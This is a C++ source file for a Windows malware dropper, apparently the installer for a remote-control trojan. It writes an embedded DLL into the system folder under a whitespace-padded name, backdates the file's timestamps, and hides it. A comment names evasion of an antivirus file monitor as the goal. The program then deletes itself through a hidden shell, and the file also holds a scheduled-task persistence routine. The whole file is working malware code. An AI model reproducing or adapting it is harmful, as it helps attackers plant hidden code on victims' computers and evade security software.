// InstallServer.cpp : Defines the entry point for the application.
//
#include "resource.h"
#include <windows.h>
#include "TLHELP32.H"
#include <lmcons.h>
#include <lmat.h>

#pragma comment(lib,"NETAPI32.LIB")

#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
#pragma comment(linker, "/STUB:stub.bin")

BOOL GetSystemVer()
{
	OSVERSIONINFOEX osvi;
	ZeroMemory(&osvi,sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if(!GetVersionEx((OSVERSIONINFO *)&osvi))
		return FALSE;
	
	switch (osvi.dwPlatformId)
	{
	case VER_PLATFORM_WIN32_NT:
		if (osvi.dwMajorVersion == 6)
		{
			return true;
		}
		else
		{
			return false;
		}
		break;
		
	case VER_PLATFORM_WIN32_WINDOWS:
		return false;
		break;
		
	default:
		return false;
    }
	
	return TRUE;
}

void JobAdd(WCHAR FilePath[])
{
	DWORD JobId;
	AT_INFO ai;
	memset(&ai,0,sizeof(ai));
	ai.Command = FilePath;
	ai.DaysOfMonth = 0;
	ai.DaysOfWeek = 0x60;
	ai.Flags = JOB_RUN_PERIODICALLY;
	ai.JobTime = 11*60*60*1000+50*60*1000;
	NetScheduleJobAdd(NULL, LPBYTE(&ai), &JobId);
}

int SEU_RandEx(int min, int max)
{
	if(min == max)
		return min;

	srand(GetTickCount());
	int seed = rand()+3;

	return seed % (max - min + 1) + min;
}

BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFilePath)
{
	HGLOBAL hResData;
	HRSRC   hResInfo;
	HANDLE  hFile;
	DWORD   dwBytes;

	char strTmpPath[MAX_PATH], strBinPath[MAX_PATH];

	// 一定要跟别的区分开，GetTickCount有可能得到一样的值
	GetTempPath(sizeof(strTmpPath), strTmpPath);
	wsprintf(strBinPath, "%s\\%d_res.tmp", strTmpPath, GetTickCount());
	
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return FALSE;

	hResData = LoadResource(hModule, hResInfo);
	if (hResData == NULL) return FALSE;

	hFile = CreateFile(strBinPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, 
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL) return FALSE;

	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear   = 2004;
	st.wMonth  = 8;
	st.wDay    = 17;
	st.wHour   = 20;
	st.wMinute = 0;
	FILETIME ft,LocalFileTime;
	SystemTimeToFileTime(&st, &ft);
	LocalFileTimeToFileTime(&ft,&LocalFileTime);
	SetFileTime(hFile, &LocalFileTime, (LPFILETIME) NULL,	&LocalFileTime);

	WriteFile(hFile, hResData, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	CloseHandle(hFile);
	FreeResource(hResData);
	
	// Fuck KV File Create Monitor
	MoveFile(strBinPath, lpFilePath);
	SetFileAttributes(lpFilePath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
	DeleteFile(strBinPath);

	return TRUE;
}

void DelSelf()
{
	char szModule [MAX_PATH],
		 szComspec[MAX_PATH],
		 szParams [MAX_PATH];
	
	GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH);

	if((GetModuleFileName(0,szModule,MAX_PATH) != 0) && (GetShortPathName(szModule,szModule,MAX_PATH) != 0))
	{
		wsprintf(szParams," /c del %s > nul",szModule);
		lstrcat(szComspec,szParams);
		
		// 设置结构体成员
		STARTUPINFO  si={0};
		PROCESS_INFORMATION pi={0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
		
		// 调用命令
		if(CreateProcess(0, szComspec, 0, 0, 0,CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// 暂停命令直到程序退出
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);
			// 恢复命令并设置低优先权
			ResumeThread(pi.hThread);
			return;
		}
		else // 如果出错，格式化分配的空间
		{
			SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
		}
	}
}

//////////////////////////////////////////////////////////////////////////////
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	char szDllPath[MAX_PATH],szSysPath[MAX_PATH];
    GetSystemDirectory(szSysPath, MAX_PATH);
	wsprintf(szDllPath,"%s\\WinNet                                               %c.dll",szSysPath,SEU_RandEx('a','z'));

	ReleaseResource(NULL, IDR_DLL, "DLL", szDllPath);

	DelSelf();
	return 0;
}
